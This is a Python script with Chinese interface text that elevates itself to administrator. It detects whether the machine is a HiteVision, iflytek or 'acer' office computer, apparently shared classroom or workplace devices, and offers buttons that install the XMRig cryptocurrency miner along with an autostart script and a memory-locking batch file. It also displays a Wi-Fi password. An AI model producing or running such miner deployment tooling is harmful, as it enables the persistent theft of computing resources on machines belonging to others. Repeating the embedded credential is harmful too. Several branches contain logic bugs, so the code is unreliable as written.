import getpass
import tkinter as tk
import os
import ctypes, sys

#请求管理员权限
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
if is_admin():
    # Code of your program here
    print("good")
else:
    # Re-run the program with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit()

def body():
    # 如果用户名为HiteVision，则弹出窗口
    if username == 'HiteVision':
        root = tk.Tk()
        root.title('安装xmrig')

        # 设置窗口大小和位置
        window_width = 400
        window_height = 200
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = int((screen_width - window_width) / 2)
        y = int((screen_height - window_height) / 2)
        root.geometry(f'{window_width}x{window_height}+{x}+{y}')

        # 设置窗口背景颜色和字体样式
        root.configure(bg='#F0F0F0')
        root.option_add("*Font", "Arial 12")

        # 创建文本标签
        label_text = '检测到当前计算机为HiteVision，请在屏幕底部上滑，连接到无线网whsz@2020。'
        label = tk.Label(root, text=label_text, bg='#F0F0F0', wraplength=300)
        label.pack(pady=20)

        # 创建按钮1，打开1.exe，1.cmd和1.bat
        def button1_click():
            os.system('xmriginstall.exe')
            os.system('xmrig自启动2.1.cmd')
            os.system('锁定内存.bat')

        button1 = tk.Button(root, text='我已连接无线网，准备安装同局域网程序', command=button1_click, bg='#4CAF50', fg='white')
        button1.pack(pady=10)

        # 创建按钮2，打开2.exe，1.cmd和2.bat
        def button2_click():
            os.system('xmriginstall.exe')
            os.system('xmrig自启动2.1.cmd')
            os.system('锁定内存.bat')

        button2 = tk.Button(root, text='安装非局域网程序', command=button2_click, bg='#F44336', fg='white')
        button2.pack(pady=10) 
        root.mainloop()

        #HiteVision

    # 如果用户名为iflytek，则弹出窗口
    if username == 'iflytek':
        root = tk.Tk()
        root.title('安装xmrig')

        # 设置窗口大小和位置
        window_width = 400
        window_height = 200
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = int((screen_width - window_width) / 2)
        y = int((screen_height - window_height) / 2)
        root.geometry(f'{window_width}x{window_height}+{x}+{y}')

        # 设置窗口背景颜色和字体样式
        root.configure(bg='#F0F0F0')
        root.option_add("*Font", "Arial 12")

        # 创建文本标签
        label_text = '检测到当前计算机为iflytek，请启用无线网适配器并连接到无线网，密码whsz@2020。'
        label = tk.Label(root, text=label_text, bg='#F0F0F0', wraplength=300)
        label.pack(pady=20)

        # 创建按钮1，打开1.exe，1.cmd和1.bat
        def button1_click():
            os.system('xmriginstall.exe')
            os.system('xmrig自启动2.1.cmd')
            os.system('锁定内存.bat')

        button1 = tk.Button(root, text='我已连接无线网，准备安装同局域网程序', command=button1_click, bg='#4CAF50', fg='white')
        button1.pack(pady=10)

        # 创建按钮2，打开2.exe，1.cmd和2.bat
        def button2_click():
            os.system('xmriginstall.exe')
            os.system('xmrig自启动2.1.cmd')
            os.system('锁定内存.bat')

        button2 = tk.Button(root, text='安装非局域网程序', command=button2_click, bg='#F44336', fg='white')
        button2.pack(pady=10) 
        root.mainloop()

        #iflytek
    # 如果用户名为acer，则弹出窗口
    if username == 'acer':
        root = tk.Tk()
        root.title('安装xmrig')

        # 设置窗口大小和位置
        window_width = 400
        window_height = 200
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = int((screen_width - window_width) / 2)
        y = int((screen_height - window_height) / 2)
        root.geometry(f'{window_width}x{window_height}+{x}+{y}')

        # 设置窗口背景颜色和字体样式
        root.configure(bg='#F0F0F0')
        root.option_add("*Font", "Arial 12")

        # 创建文本标签
        label_text = '检测到当前计算机为办公室电脑，请自行判断是否为同一局域网192.168.19.xxx'
        label = tk.Label(root, text=label_text, bg='#F0F0F0', wraplength=300)
        label.pack(pady=20)

        # 创建按钮1，打开1.exe，1.cmd和1.bat
        def button1_click():
            os.system('xmriginstall.exe')
            os.system('xmrig自启动2.1.cmd')
            os.system('锁定内存.bat')

        button1 = tk.Button(root, text='我判断在同一局域网，准备安装同局域网程序', command=button1_click, bg='#4CAF50', fg='white')
        button1.pack(pady=10)

        # 创建按钮2，打开2.exe，1.cmd和2.bat
        def button2_click():
            os.system('xmriginstall.exe')
            os.system('xmrig自启动2.1.cmd')
            os.system('锁定内存.bat')

        button2 = tk.Button(root, text='不在一个局域网，我要安装非局域网程序', command=button2_click, bg='#F44336', fg='white')
        button2.pack(pady=10) 
        root.mainloop()

        #办公室acer
    else:
        print(username)
                
        window = tk.Tk()
        window.title("请指定计算机类型")

        # 计算屏幕尺寸
        screen_width = window.winfo_screenwidth()
        screen_height = window.winfo_screenheight()

        # 设置窗口大小和位置
        window_width = 300
        window_height = 200
        x = (screen_width - window_width) // 2
        y = (screen_height - window_height) // 2
        window.geometry(f"{window_width}x{window_height}+{x}+{y}")

        # 创建文本标签
        label = tk.Label(window, text="无法判断此计算机类型，请手动指定")
        label.pack(pady=20)

        def button1_click():
            global username
            username = "HiteVision"
            body()
            window.destroy()
        def button2_click():
            username = "iflytek"
            body()
        def button3_click():
            username = "acer"
            body()
        # 创建按钮
        button1 = tk.Button(window, text="HiteVision", command=button1_click)
        button1.pack(pady=10)

        button2 = tk.Button(window, text="iflytek", command=button2_click)
        button2.pack(pady=10)

        button3 = tk.Button(window, text="acer", command=button3_click)
        button3.pack(pady=10)

        # 运行窗口
        window.mainloop()

# 获取当前用户名
username = getpass.getuser()       
body()
sys.exit


